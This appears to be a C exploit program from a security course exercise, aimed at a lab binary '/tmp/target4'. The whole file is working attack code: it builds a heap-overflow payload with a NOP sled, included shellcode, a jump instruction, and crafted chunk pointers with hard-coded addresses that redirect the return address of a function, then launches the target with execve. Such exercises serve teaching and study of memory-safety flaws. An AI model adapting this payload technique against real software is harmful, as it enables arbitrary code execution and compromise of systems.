#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  int size = 900;
  char payload[size];
  int i;

  for(i = 0; i < 500; i++) {
    payload[i] = 0x90;
  }

  // Inject shellcode
  int ptr = 400;
  for(i = 0; i < strlen(shellcode); i++) {
    payload[ptr] = shellcode[i];
    ptr++;
  }

  // Write jmp instruction to shellcode
  payload[ptr] = 0xEC;
  ptr++;
  payload[ptr] = 0xEB;
  ptr++;

  // Pad the remaining bits until p->s.l with 1's to set FREEBIT
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;
  payload[ptr] = 0x1;
  ptr++;

  // Write address of jmp instruction (jmp to nop sled) to p->s.l (will be written to address in p->s.r)
  payload[504] = 0x05;
  payload[505] = 0x9C;
  payload[506] = 0x04;
  payload[507] = 0x08;
  
  // Overwrite p->s.r with return address of foo
  payload[508] = 0x1C;
  payload[509] = 0xFc;
  payload[510] = 0xFF;
  payload[511] = 0xBF;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
